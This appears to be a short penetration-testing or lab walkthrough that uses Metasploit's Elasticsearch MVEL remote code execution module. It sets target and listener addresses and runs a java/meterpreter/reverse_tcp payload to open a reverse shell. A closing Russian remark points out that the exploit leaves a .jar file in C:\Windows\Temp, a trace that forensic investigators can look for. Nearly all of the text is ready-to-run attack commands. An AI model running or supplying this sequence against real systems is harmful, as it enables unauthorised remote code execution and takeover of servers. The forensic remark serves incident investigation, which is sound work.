```
search mvel
```

```
exploit/multi/elasticsearch/script_mvel_rce
```

```
set RHOST <$REMOTE_IP>
set LHOST <$LOCAL_IP>
set LPORT <$LOCAL_PORT>
set PAYLOAD java/meterpreter/reverse_tcp
```

```
exploit
```

> Обратите внимание, что эксплойт создает файл .jar в папке: C:\Windows\Temp и это возможный след для специалиста форензики, позволяющий понять как была выполнена эксплуатация системы, то есть надо обращать внимание на такие файлы при расследовании инцидента.